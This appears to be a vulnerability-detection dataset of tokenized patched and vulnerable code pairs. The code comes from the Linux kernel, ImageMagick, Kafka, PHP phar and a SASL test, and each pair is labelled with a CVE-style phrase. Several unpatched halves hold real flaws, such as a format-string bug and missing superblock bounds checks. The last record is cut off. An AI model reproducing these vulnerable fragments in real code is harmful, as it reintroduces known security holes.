{"contents": ["empty"], "code_tokens": ["static", "inline", "bool", "sanity_check_area_boundary", "(", "struct", "super_block", "*", "sb", ",", "struct", "f2fs_super_block", "*", "raw_super", ")", "{", "u32", "segment0_blkaddr", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "segment0_blkaddr", ")", ";", "u32", "cp_blkaddr", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "cp_blkaddr", ")", ";", "u32", "sit_blkaddr", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "sit_blkaddr", ")", ";", "u32", "nat_blkaddr", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "nat_blkaddr", ")", ";", "u32", "ssa_blkaddr", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "ssa_blkaddr", ")", ";", "u32", "main_blkaddr", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "main_blkaddr", ")", ";", "u32", "segment_count_ckpt", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "segment_count_ckpt", ")", ";", "u32", "segment_count_sit", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "segment_count_sit", ")", ";", "u32", "segment_count_nat", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "segment_count_nat", ")", ";", "u32", "segment_count_ssa", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "segment_count_ssa", ")", ";", "u32", "segment_count_main", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "segment_count_main", ")", ";", "u32", "segment_count", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "segment_count", ")", ";", "u32", "log_blocks_per_seg", "=", "le32_to_cpu", "(", "raw_super", "-", ">", "log_blocks_per_seg", ")", ";", "if", "(", "segment0_blkaddr", "!", "=", "cp_blkaddr", ")", "{", "f2fs_msg", "(", "sb", ",", "KERN_INFO", ",", "\"", "Mismatch", "start", "address", ",", "segment0", "(", "%", "u", ")", "cp_blkaddr", "(", "%", "u", ")", "\",", "segment0_blkaddr", ",", "cp_blkaddr", ")", ";", "return", "true", ";", "}", "if", "(", "cp_blkaddr", "+", "(", "segment_count_ckpt", "<", "<", "log_blocks_per_seg", ")", "!", "=", "sit_blkaddr", ")", "{", "f2fs_msg", "(", "sb", ",", "KERN_INFO", ",", "\"", "Wrong", "CP", "boundary", ",", "start", "(", "%", "u", ")", "end", "(", "%", "u", ")", "blocks", "(", "%", "u", ")", "\",", "cp_blkaddr", ",", "sit_blkaddr", ",", "segment_count_ckpt", "<", "<", "log_blocks_per_seg", ")", ";", "return", "true", ";", "}", "if", "(", "sit_blkaddr", "+", "(", "segment_count_sit", "<", "<", "log_blocks_per_seg", ")", "!", "=", "nat_blkaddr", ")", "{", "f2fs_msg", "(", "sb", ",", "KERN_INFO", ",", "\"", "Wrong", "SIT", "boundary", ",", "start", "(", "%", "u", ")", "end", "(", "%", "u", ")", "blocks", "(", "%", "u", ")", "\",", "sit_blkaddr", ",", "nat_blkaddr", ",", "segment_count_sit", "<", "<", "log_blocks_per_seg", ")", ";", "return", "true", ";", "}", "if", "(", "nat_blkaddr", "+", "(", "segment_count_nat", "<", "<", "log_blocks_per_seg", ")", "!", "=", "ssa_blkaddr", ")", "{", "f2fs_msg", "(", "sb", ",", "KERN_INFO", ",", "\"", "Wrong", "NAT", "boundary", ",", "start", "(", "%", "u", ")", "end", "(", "%", "u", ")", "blocks", "(", "%", "u", ")", "\",", "nat_blkaddr", ",", "ssa_blkaddr", ",", "segment_count_nat", "<", "<", "log_blocks_per_seg", ")", ";", "return", "true", ";", "}", "if", "(", "ssa_blkaddr", "+", "(", "segment_count_ssa", "<", "<", "log_blocks_per_seg", ")", "!", "=", "main_blkaddr", ")", "{", "f2fs_msg", "(", "sb", ",", "KERN_INFO", ",", "\"", "Wrong", "SSA", "boundary", ",", "start", "(", "%", "u", ")", "end", "(", "%", "u", ")", "blocks", "(", "%", "u", ")", "\",", "ssa_blkaddr", ",", "main_blkaddr", ",", "segment_count_ssa", "<", "<", "log_blocks_per_seg", ")", ";", "return", "true", ";", "}", "if", "(", "main_blkaddr", "+", "(", "segment_count_main", "<", "<", "log_blocks_per_seg", ")", "!", "=", "segment0_blkaddr", "+", "(", "segment_count", "<", "<", "log_blocks_per_seg", ")", ")", "{", "f2fs_msg", "(", "sb", ",", "KERN_INFO", ",", "\"", "Wrong", "MAIN_AREA", "boundary", ",", "start", "(", "%", "u", ")", "end", "(", "%", "u", ")", "blocks", "(", "%", "u", ")", "\",", "main_blkaddr", ",", "segment0_blkaddr", "+", "(", "segment_count", "<", "<", "log_blocks_per_seg", ")", ",", "segment_count_main", "<", "<", "log_blocks_per_seg", ")", ";", "return", "true", ";", "}", "return", "false", ";", "}", "/", "*", "check", "log", "blocks", "per", "segment", "*", "/", "if", "(", "le32_to_cpu", "(", "raw_super", "-", ">", "log_blocks_per_seg", ")", "!", "=", "9", ")", "{", "f2fs_msg", "(", "sb", ",", "KERN_INFO", ",", "\"", "Invalid", "log", "blocks", "per", "segment", "(", "%", "u", ")", "\\", "n", "\"", ",", "le32_to_cpu", "(", "raw_super", "-", ">", "log_blocks_per_seg", ")", ");", "return", "1", ";", "}", "/", "*", "check", "reserved", "ino", "info", "*", "/", "if", "(", "le32_to_cpu", "(", "raw_super", "-", ">", "node_ino", ")", "!", "=", "1", "|", "|", "le32_to_cpu", "(", "raw_super", "-", ">", "meta_ino", ")", "!", "=", "2", "|", "|", "le32_to_cpu", "(", "raw_super", "-", ">", "root_ino", ")", "!", "=", "3", ")", "{", "f2fs_msg", "(", "sb", ",", "KERN_INFO", ",", "\"", "Invalid", "Fs", "Meta", "Ino", ":", "node", "(", "%", "u", ")", "meta", "(", "%", "u", ")", "root", "(", "%", "u", ")", "\",", "le32_to_cpu", "(", "raw_super", "-", ">", "node_ino", ")", ",", "le32_to_cpu", "(", "raw_super", "-", ">", "meta_ino", ")", ",", "le32_to_cpu", "(", "raw_super", "-", ">", "root_ino", ")", ");", "return", "1", ";", "}", "/", "*", "check", "CP", "/", "SIT", "/", "NAT", "/", "SSA", "/", "MAIN_AREA", "area", "boundary", "*", "/", "if", "(", "sanity_check_area_boundary", "(", "sb", ",", "raw_super", ")", ")", "return", "1", ";</s>"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "application"]}
{"contents": ["empty"], "code_tokens": ["ConstrainColormapIndex", "(", "image", ",", "GetPixelIndex", "(", "image", ",", "q", ")", ",", "exception", ")", ",", "q", ")", ";</s>GetPixelIndex", "(", "image", ",", "q", ")", ",", "q", ")", ";"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially", "crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "unlikely", "(", "static_cpu_has", "(", "X86_FEATURE_FXSAVE_LEAK", ")", "))", "{", "asm", "volatile", "(", "\"", "fnclex", "\\", "n", "\\", "t", "\"", "\"", "emms", "\\", "n", "\\", "t", "\"", "\"", "fildl", "%", "P", "[", "addr", "]", "\"", "/", "*", "set", "F", "?", "P", "to", "defined", "value", "*", "/", ":", ":", "[", "addr", "]", "\"", "m", "\"", "(", "tsk", "-", ">", "thread", ".", "fpu", ".", "has_fpu", ")", ");", "}</s>alternative_input", "(", "ASM_NOP8", "ASM_NOP2", ",", "\"", "emms", "\\", "n", "\\", "t", "\"", "/", "*", "clear", "stack", "tags", "*", "/", "\"", "fildl", "%", "P", "[", "addr", "]", "\",", "/", "*", "set", "F", "?", "P", "to", "defined", "value", "*", "/", "X86_FEATURE_FXSAVE_LEAK", ",", "[", "addr", "]", "\"", "m", "\"", "(", "tsk", "-", ">", "thread", ".", "fpu", ".", "has_fpu", ")", ");"], "docstring_tokens": ["via", "a", "crafted", "application", "."]}
{"contents": ["empty"], "code_tokens": ["public", "void", "start", "(", ")", "throws", "Exception", "{", "super", ".", "start", "(", ");</s>public", "void", "init", "(", ")", "throws", "Exception", "{", "super", ".", "init", "(", ");"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["import", "static", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ".", "US_ASCII", ";", "import", "static", "org", ".", "mockito", ".", "AdditionalMatchers", ".", "not", ";", "import", "static", "org", ".", "mockito", ".", "Matchers", ".", "anyString", ";", "public", "static", "final", "String", "RESPONSE_FORMAT_STRING", "=", "\"", "\\", "0", "%", "s", "\\", "0", "%", "s", "\"", ";", "private", "static", "final", "String", "VALID_RESPONSE", "=", "String", ".", "format", "(", "RESPONSE_FORMAT_STRING", ",", "VALID_USERNAME", ",", "VALID_PASSWORD", ")", ";", "private", "AuthenticationResult", "_successfulResult", ";", "private", "AuthenticationResult", "_errorResult", ";", "_successfulResult", "=", "mock", "(", "AuthenticationResult", ".", "class", ")", ";", "_errorResult", "=", "mock", "(", "AuthenticationResult", ".", "class", ")", ";", "when", "(", "_authenticationProvider", ".", "authenticate", "(", "eq", "(", "VALID_USERNAME", ")", ",", "eq", "(", "VALID_PASSWORD", ")", "))", ".", "thenReturn", "(", "_successfulResult", ")", ";", "when", "(", "_authenticationProvider", ".", "authenticate", "(", "eq", "(", "VALID_USERNAME", ")", ",", "not", "(", "eq", "(", "VALID_PASSWORD", ")", "))", ").", "thenReturn", "(", "_errorResult", ")", ";", "when", "(", "_authenticationProvider", ".", "authenticate", "(", "not", "(", "eq", "(", "VALID_USERNAME", ")", "),", "anyString", "(", "))", ").", "thenReturn", "(", "_errorResult", ")", ";", "final", "AuthenticationResult", "result", "=", "_negotiator", ".", "handleResponse", "(", "VALID_RESPONSE", ".", "getBytes", "(", "US_ASCII", ")", ");", "assertEquals", "(", "\"", "Unexpected", "authentication", "result", "\"", ",", "_successfulResult", ",", "result", ")", ";", "final", "AuthenticationResult", "firstResult", "=", "_negotiator", ".", "handleResponse", "(", "VALID_RESPONSE", ".", "getBytes", "(", "US_ASCII", ")", ");", "assertEquals", "(", "\"", "Unexpected", "first", "authentication", "result", "\"", ",", "_successfulResult", ",", "firstResult", ")", ";", "final", "AuthenticationResult", "secondResult", "=", "_negotiator", ".", "handleResponse", "(", "VALID_RESPONSE", ".", "getBytes", "(", "US_ASCII", ")", ");", "public", "void", "testHandleInvalidUser", "(", ")", "throws", "Exception", "{", "final", "AuthenticationResult", "result", "=", "_negotiator", ".", "handleResponse", "(", "String", ".", "format", "(", "RESPONSE_FORMAT_STRING", ",", "\"", "invalidUser", "\"", ",", "VALID_PASSWORD", ")", ".", "getBytes", "(", "US_ASCII", ")", ");", "assertEquals", "(", "\"", "Unexpected", "authentication", "result", "\"", ",", "_errorResult", ",", "result", ")", ";", "}", "public", "void", "testHandleInvalidPassword", "(", ")", "throws", "Exception", "{", "final", "AuthenticationResult", "result", "=", "_negotiator", ".", "handleResponse", "(", "String", ".", "format", "(", "RESPONSE_FORMAT_STRING", ",", "VALID_USERNAME", ",", "\"", "invalidPassword", "\"", ").", "getBytes", "(", "US_ASCII", ")", ");", "assertEquals", "(", "\"", "Unexpected", "authentication", "result", "\"", ",", "_errorResult", ",", "result", ")", ";", "}", "public", "void", "testHandleNeverSendAResponse", "(", ")", "throws", "Exception", "{", "final", "AuthenticationResult", "firstResult", "=", "_negotiator", ".", "handleResponse", "(", "new", "byte", "[", "0", "]", ");", "assertEquals", "(", "\"", "Unexpected", "authentication", "status", "\"", ",", "AuthenticationResult", ".", "AuthenticationStatus", ".", "CONTINUE", ",", "firstResult", ".", "getStatus", "(", "))", ";", "assertArrayEquals", "(", "\"", "Unexpected", "authentication", "challenge", "\"", ",", "new", "byte", "[", "0", "]", ",", "firstResult", ".", "getChallenge", "(", "))", ";", "final", "AuthenticationResult", "secondResult", "=", "_negotiator", ".", "handleResponse", "(", "new", "byte", "[", "0", "]", ");", "assertEquals", "(", "\"", "Unexpected", "first", "authentication", "result", "\"", ",", "AuthenticationResult", ".", "AuthenticationStatus", ".", "ERROR", ",", "secondResult", ".", "getStatus", "(", "))", ";", "}", "assertEquals", "(", "\"", "Unexpected", "first", "authentication", "result", "\"", ",", "_successfulResult", ",", "firstResult", ")", ";", "assertEquals", "(", "\"", "Unexpected", "first", "authentication", "result", "\"", ",", "_successfulResult", ",", "firstResult", ")", ";</s>private", "static", "final", "String", "VALID_RESPONSE", "=", "String", ".", "format", "(", "\"\\", "0", "%", "s", "\\", "0", "%", "s", "\"", ",", "VALID_USERNAME", ",", "VALID_PASSWORD", ")", ";", "private", "AuthenticationResult", "_expectedResult", ";", "_expectedResult", "=", "mock", "(", "AuthenticationResult", ".", "class", ")", ";", "when", "(", "_authenticationProvider", ".", "authenticate", "(", "eq", "(", "VALID_USERNAME", ")", ",", "eq", "(", "VALID_PASSWORD", ")", "))", ".", "thenReturn", "(", "_expectedResult", ")", ";", "final", "AuthenticationResult", "result", "=", "_negotiator", ".", "handleResponse", "(", "VALID_RESPONSE", ".", "getBytes", "(", "))", ";", "assertEquals", "(", "\"", "Unexpected", "authentication", "result", "\"", ",", "_expectedResult", ",", "result", ")", ";", "final", "AuthenticationResult", "firstResult", "=", "_negotiator", ".", "handleResponse", "(", "VALID_RESPONSE", ".", "getBytes", "(", "))", ";", "assertEquals", "(", "\"", "Unexpected", "first", "authentication", "result", "\"", ",", "_expectedResult", ",", "firstResult", ")", ";", "final", "AuthenticationResult", "secondResult", "=", "_negotiator", ".", "handleResponse", "(", "VALID_RESPONSE", ".", "getBytes", "(", "))", ";", "assertEquals", "(", "\"", "Unexpected", "first", "authentication", "result", "\"", ",", "_expectedResult", ",", "firstResult", ")", ";", "assertEquals", "(", "\"", "Unexpected", "first", "authentication", "result", "\"", ",", "_expectedResult", ",", "firstResult", ")", ";"], "docstring_tokens": ["including", "\"PLAIN", "\"", "in", "the", "\"disabledMechanisms", "\"", "attribute", "of", "the", "provider"]}
{"contents": ["empty"], "code_tokens": ["int", "dir_has_error", "=", "0", ";", "if", "(", "!", "dir_has_error", ")", "{", "ext4_error", "(", "sb", ",", "__func__", ",", "\"", "directory", "#", "%", "lu", "\"", "\"", "contains", "a", "hole", "at", "offset", "%", "Lu", "\"", ",", "inode", "-", ">", "i_ino", ",", "(", "unsigned", "long", "long", ")", "filp", "-", ">", "f_pos", ")", ";", "dir_has_error", "=", "1", ";", "}</s>ext4_error", "(", "sb", ",", "\"", "ext4_readdir", "\"", ",", "\"", "directory", "#", "%", "lu", "contains", "a", "hole", "at", "offset", "%", "lu", "\"", ",", "inode", "-", ">", "i_ino", ",", "(", "unsigned", "long", ")", "filp", "-", ">", "f_pos", ")", ";"], "docstring_tokens": ["performing", "either", "a", "read", "or", "write", "operation", "on", "the", "mounted", "image", "or", "partition"]}
{"contents": ["empty"], "code_tokens": ["atomic_inc", "(", "&", "cm_id_priv", "-", ">", "refcount", ")", ";</s>"], "docstring_tokens": ["sending", "a", "specially-crafted", "InfiniBand", "request"]}
{"contents": ["empty"], "code_tokens": ["/", "/", "Visible", "for", "testing", "static", "Set", "<", "String", ">", "keysWithVariableValues", "(", "Map", "<", "String", ",", "String", ">", "rawConfig", ",", "Pattern", "pattern", ")", "{", "if", "(", "matcher", ".", "find", "(", "))", "{", "import", "org", ".", "apache", ".", "kafka", ".", "common", ".", "config", ".", "ConfigTransformer", ";", "import", "static", "org", ".", "apache", ".", "kafka", ".", "connect", ".", "runtime", ".", "AbstractHerder", ".", "keysWithVariableValues", ";", "@", "Test", "public", "void", "testConfigProviderRegex", "(", ")", "{", "testConfigProviderRegex", "(", "\"\\", "\"$", "{:", ":}", "\\\"", "\")", ";", "testConfigProviderRegex", "(", "\"$", "{:", ":}", "\")", ";", "testConfigProviderRegex", "(", "\"\\", "\"$", "{:", "/", "a", ":", "somevar", "}", "\\\"", "\")", ";", "testConfigProviderRegex", "(", "\"\\", "\"$", "{", "file", ":", ":", "somevar", "}", "\\\"", "\")", ";", "testConfigProviderRegex", "(", "\"$", "{", "file", ":", "/", "a", "/", "b", "/", "c", ":", "}\"", ");", "testConfigProviderRegex", "(", "\"$", "{", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "\")", ";", "testConfigProviderRegex", "(", "\"\\", "\"$", "{", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "\\\"", "\")", ";", "testConfigProviderRegex", "(", "\"", "plain", ".", "PlainLoginModule", "required", "username", "=", "\\\"", "${", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "\\\"", "\")", ";", "testConfigProviderRegex", "(", "\"", "plain", ".", "PlainLoginModule", "required", "username", "=", "${", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "\")", ";", "testConfigProviderRegex", "(", "\"", "plain", ".", "PlainLoginModule", "required", "username", "=", "${", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "not", "null", "\"", ");", "testConfigProviderRegex", "(", "\"", "plain", ".", "PlainLoginModule", "required", "username", "=", "${", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "password", "=", "${", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "othervar", "}", "\")", ";", "testConfigProviderRegex", "(", "\"", "plain", ".", "PlainLoginModule", "required", "username", "\"", ",", "false", ")", ";", "}", "private", "void", "testConfigProviderRegex", "(", "String", "rawConnConfig", ")", "{", "testConfigProviderRegex", "(", "rawConnConfig", ",", "true", ")", ";", "}", "private", "void", "testConfigProviderRegex", "(", "String", "rawConnConfig", ",", "boolean", "expected", ")", "{", "Set", "<", "String", ">", "keys", "=", "keysWithVariableValues", "(", "Collections", ".", "singletonMap", "(", "\"", "key", "\"", ",", "rawConnConfig", ")", ",", "ConfigTransformer", ".", "DEFAULT_PATTERN", ")", ";", "boolean", "actual", "=", "keys", "!", "=", "null", "&", "&", "!", "keys", ".", "isEmpty", "(", ")", "&", "&", "keys", ".", "contains", "(", "\"", "key", "\"", ");", "assertEquals", "(", "String", ".", "format", "(", "\"%", "s", "should", "have", "matched", "regex", "\"", ",", "rawConnConfig", ")", ",", "expected", ",", "actual", ")", ";", "}", "TOPIC", "=", "\"", "topic", "-", "${", "file", ":", "%", "s", ":", "topic", ".", "external", "}", "\"", "%", "ConnectServiceBase", ".", "EXTERNAL_CONFIGS_FILE</s>private", "static", "Set", "<", "String", ">", "keysWithVariableValues", "(", "Map", "<", "String", ",", "String", ">", "rawConfig", ",", "Pattern", "pattern", ")", "{", "if", "(", "matcher", ".", "matches", "(", "))", "{", "TOPIC", "=", "\"", "${", "file", ":", "%", "s", ":", "topic", ".", "external", "}", "\"", "%", "ConnectServiceBase", ".", "EXTERNAL_CONFIGS_FILE"], "docstring_tokens": ["sending", "specially", "crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "spl_ce_BadMethodCallException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "spl_ce_UnexpectedValueException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "spl_ce_BadMethodCallException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "spl_ce_BadMethodCallException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "\"", "%", "s", "\"", ",", "error", ")", ";</s>zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "spl_ce_BadMethodCallException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "spl_ce_UnexpectedValueException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "spl_ce_BadMethodCallException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "spl_ce_BadMethodCallException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";", "zend_throw_exception_ex", "(", "phar_ce_PharException", ",", "0", "TSRMLS_CC", ",", "error", ")", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "request", "containing", "malicious", "format", "specifiers"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "*", "This", "is", "the", "base", "location", "for", "PIE", "(", "ET_DYN", "with", "INTERP", ")", "loads", ".", "On", "*", "64", "-", "bit", ",", "this", "is", "raised", "to", "4GB", "to", "leave", "the", "entire", "32", "-", "bit", "address", "*", "space", "open", "for", "things", "that", "want", "to", "use", "the", "area", "for", "32", "-", "bit", "pointers", ".", "*", "/", "#", "define", "ELF_ET_DYN_BASE", "(", "mmap_is_ia32", "(", ")", "?", "0x000400000UL", ":", "\\", "0x100000000UL", ")", "/", "*", "*", "If", "we", "are", "loading", "ET_EXEC", "or", "we", "have", "already", "performed", "*", "the", "ET_DYN", "load_addr", "calculations", ",", "proceed", "normally", ".", "*", "/", "/", "*", "*", "This", "logic", "is", "run", "once", "for", "the", "first", "LOAD", "Program", "*", "Header", "for", "ET_DYN", "binaries", "to", "calculate", "the", "*", "randomization", "(", "load_bias", ")", "for", "all", "the", "LOAD", "*", "Program", "Headers", ",", "and", "to", "calculate", "the", "entire", "*", "size", "of", "the", "ELF", "mapping", "(", "total_size", ")", ".", "(", "Note", "that", "*", "load_addr_set", "is", "set", "to", "true", "later", "once", "the", "*", "initial", "mapping", "is", "performed", ".", ")", "*", "*", "There", "are", "effectively", "two", "types", "of", "ET_DYN", "*", "binaries", ":", "programs", "(", "i", ".", "e", ".", "PIE", ":", "ET_DYN", "with", "INTERP", ")", "*", "and", "loaders", "(", "ET_DYN", "without", "INTERP", ",", "since", "they", "*", "_are_", "the", "ELF", "interpreter", ")", ".", "The", "loaders", "must", "*", "be", "loaded", "away", "from", "programs", "since", "the", "program", "*", "may", "otherwise", "collide", "with", "the", "loader", "(", "especially", "*", "for", "ET_EXEC", "which", "does", "not", "have", "a", "randomized", "*", "position", ")", ".", "For", "example", "to", "handle", "invocations", "of", "*", "\"", "./", "ld", ".", "so", "someprog", "\"", "to", "test", "out", "a", "new", "version", "of", "*", "the", "loader", ",", "the", "subsequent", "program", "that", "the", "*", "loader", "loads", "must", "avoid", "the", "loader", "itself", ",", "so", "*", "they", "cannot", "share", "the", "same", "load", "range", ".", "Sufficient", "*", "room", "for", "the", "brk", "must", "be", "allocated", "with", "the", "*", "loader", "as", "well", ",", "since", "brk", "must", "be", "available", "with", "*", "the", "loader", ".", "*", "*", "Therefore", ",", "programs", "are", "loaded", "offset", "from", "*", "ELF_ET_DYN_BASE", "and", "loaders", "are", "loaded", "into", "the", "*", "independently", "randomized", "mmap", "region", "(", "0", "load_bias", "*", "without", "MAP_FIXED", ")", ".", "*", "/", "if", "(", "elf_interpreter", ")", "{", "load_bias", "=", "ELF_ET_DYN_BASE", ";", "if", "(", "current", "-", ">", "flags", "&", "PF_RANDOMIZE", ")", "load_bias", "+", "=", "arch_mmap_rnd", "(", ");", "elf_flags", "|", "=", "MAP_FIXED", ";", "}", "else", "load_bias", "=", "0", ";", "/", "*", "*", "Since", "load_bias", "is", "used", "for", "all", "subsequent", "loading", "*", "calculations", ",", "we", "must", "lower", "it", "by", "the", "first", "vaddr", "*", "so", "that", "the", "remaining", "calculations", "based", "on", "the", "*", "ELF", "vaddrs", "will", "be", "correctly", "offset", ".", "The", "result", "*", "is", "then", "page", "aligned", ".", "*", "/", "load_bias", "=", "ELF_PAGESTART", "(", "load_bias", "-", "vaddr", ")", ";</s>/", "*", "This", "is", "the", "location", "that", "an", "ET_DYN", "program", "is", "loaded", "if", "exec", "'", "ed", ".", "Typical", "use", "of", "this", "is", "to", "invoke", "\"", "./", "ld", ".", "so", "someprog", "\"", "to", "test", "out", "a", "new", "version", "of", "the", "loader", ".", "We", "need", "to", "make", "sure", "that", "it", "is", "out", "of", "the", "way", "of", "the", "program", "that", "it", "will", "\"", "exec", "\"", ",", "and", "that", "there", "is", "sufficient", "room", "for", "the", "brk", ".", "*", "/", "#", "define", "ELF_ET_DYN_BASE", "(", "TASK_SIZE", "/", "3", "*", "2", ")", "/", "*", "Try", "and", "get", "dynamic", "programs", "out", "of", 